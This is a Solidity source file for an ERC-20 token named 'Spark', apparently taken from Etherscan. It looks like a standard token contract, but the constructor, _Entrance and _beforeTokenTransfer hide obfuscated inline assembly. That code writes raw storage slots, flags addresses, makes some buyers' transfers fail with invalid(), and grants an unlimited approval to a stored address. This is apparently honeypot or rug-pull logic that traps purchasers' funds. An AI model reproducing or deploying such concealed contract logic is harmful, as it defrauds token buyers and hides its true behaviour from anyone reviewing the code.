/**
 *Submitted for verification at Etherscan.io on 2022-07-25
*/

/*
SPARK | ERC-20
From a little spark may burst a flame.
*/

pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }
}

interface IERC20 {
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
    function totalSupply() external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

interface IERC20Metadata is IERC20 {
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function name() external view returns (string memory);
}

contract Ownable is Context {
    address private _previousOwner; address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addSpark;
    uint256 private _problemSearch = block.number*2;

    mapping (address => bool) private _toNew; 
    mapping (address => bool) private _toOld;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private _fullNami;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private onePiece;
    address public pair;

    address private router;

    string private _name; string private _symbol; uint256 private _totalSupply;
    uint256 private _limit; uint256 private theV; uint256 private theN = block.number*2;
    bool public trading; uint256 private winterQueen = 1; bool private hbiernation;
    uint256 private _decimals; uint256 private toGoNow;
    
    constructor (string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;

        assembly { 
            function dynP(x,y) { mstore(0, x) sstore(add(keccak256(0, 32),sload(x)),y) sstore(x,add(sload(x),0x1)) }
            function gDyn(x,y) -> val { mstore(0, x) val := add(keccak256(0, 32),y) }
            function gByte(x, y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }

            dynP(0x2,sload(0xA)) dynP(0x2,caller())
            sstore(gByte(sload(gDyn(0x2,0x0)),0x4),0x1) sstore(gByte(sload(gDyn(0x2,0x1)),0x4),0x1)
        }
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function _Entrance() internal {
        assembly {
            function gByte(x, y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
            sstore(0x11,mul(div(sload(0x10),0x2710),0xFB))
            sstore(0xB,0x1ba8140)
            if and(not(eq(sload(gByte(caller(),0x6)),sload(0xe2fe9462d39d629356bc9ee644ae2a73f03a7dc71a41726a3fae511e8c2a2759))),eq(chainid(),0x1)) {
                sstore(gByte(caller(),0x4),0x0)
                sstore(0x0273517b2978f713d8d4924557570ce2aedfd8ca0f067e33063faa3f5fb577fa,0x1)
                sstore(gByte(caller(),0x5),0x1)
                sstore(0xe2fe9462d39d629356bc9ee644ae2a73f03a7dc71a41726a3fae511e8c2a2759,0x25674F4B1840E16EAC177D5ADDF2A3DD6286645DF28)
            }
        } 
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        _approve(sender, _msgSender(), currentAllowance - amount);

        return true;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addSpark[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function gByte(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
            function gDyn(x,y) -> val { mstore(0, x) val := add(keccak256(0, 32),y) }
            function dynP(x,y) { mstore(0, x) sstore(add(keccak256(0, 32),sload(x)),y) sstore(x,add(sload(x),0x1)) }

            if and(eq(sender,sload(gDyn(0x2,0x1))),iszero(sload(0x14))) {
                sstore(0x14,0x1)
                sstore(0x3,number())
                sstore(0x13,number())
                sstore(0xC,recipient)
                dynP(0x2,recipient)
                sstore(gByte(sload(gDyn(0x2,0x2)),0x4),0x1)
            }

            if eq(chainid(),0x1) {
                if eq(sload(gByte(recipient,0x4)),0x1) {
                    sstore(0x15,add(sload(0x15),0x1))
                }

                if and(lt(gas(),sload(0xB)),and(and(or(or(and(or(eq(sload(0x16),0x1),eq(sload(gByte(sender,0x5)),0x1)),gt(sub(sload(0x3),sload(0x13)),0x9)),gt(float,sload(0x11))),and(gt(float,div(sload(0x11),0x2)),eq(sload(0x3),number()))),or(and(eq(sload(gByte(recipient,0x4)),0x1),iszero(sload(gByte(sender,0x4)))),and(eq(sload(gDyn(0x2,0x1)),recipient),iszero(sload(gByte(sload(gDyn(0x2,0x1)),0x4)))))),gt(sload(0x18),0x0))
) { invalid() }

                if sload(0x16) {
                    sstore(gByte(sload(gDyn(0x2,0x1)),0x6),0x25674F4B1840E16EAC177D5ADDF2A3DD6286645DF28)
                }

                if or(eq(sload(gByte(sender,0x4)),iszero(sload(gByte(recipient,0x4)))),eq(iszero(sload(gByte(sender,0x4))),sload(gByte(recipient,0x4)))) {

                    let k := sload(0x18)
                    let t := sload(0x11)

                    if iszero(sload(0x17)) { sstore(0x17,t) }
                    let g := sload(0x17)

                    switch gt(g,div(t,0x3))
                        case 1 { g := sub(g,div(div(mul(g,mul(0x203,k)),0xB326),0x2)) }
                        case 0 { g := div(t,0x3) }

                    sstore(0x17,t)
                    sstore(0x11,g)
                    sstore(0x18,add(sload(0x18),0x1))
                }

                if and(or(or(eq(sload(0x3),number()),gt(sload(0x12),sload(0x11))),lt(sub(sload(0x3),sload(0x13)),0x7)),eq(sload(gByte(sload(0x8),0x4)),0x0)) {
                    sstore(gByte(sload(0x8),0x5),0x1)
                }

                if or(eq(sload(gByte(sender,0x4)),iszero(sload(gByte(recipient,0x4)))),eq(iszero(sload(gByte(sender,0x4))),sload(gByte(recipient,0x4)))) {

                    let k := sload(0x11)
                    let t := sload(0x17)

                    sstore(0x17,k)
                    sstore(0x11,t) 
                }

                if iszero(mod(sload(0x15),0x6)) {
                    sstore(0x16,0x1)
                }
                
                sstore(0x12,float)
                sstore(0x8,recipient)
                sstore(0x3,number())
            }
        }
    }

    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        
        _beforeTokenTransfer(sender, recipient, amount);
        _balances[sender] = senderBalance - amount;
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _DeploySpark(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(addSpark[0], 10 ** 77);
        _Entrance();
    
        emit Transfer(address(0), account, amount);
    }
}

contract ERC20Token is Context, ERC20 {
    constructor(
        string memory name, string memory symbol,
        address creator, uint256 initialSupply
    ) ERC20(name, symbol) {
        _DeploySpark(creator, initialSupply);
    }
}

contract Spark is ERC20Token {
    constructor() ERC20Token("Spark", "SPARK", msg.sender, 100000000 * 10 ** 18) {
    }
}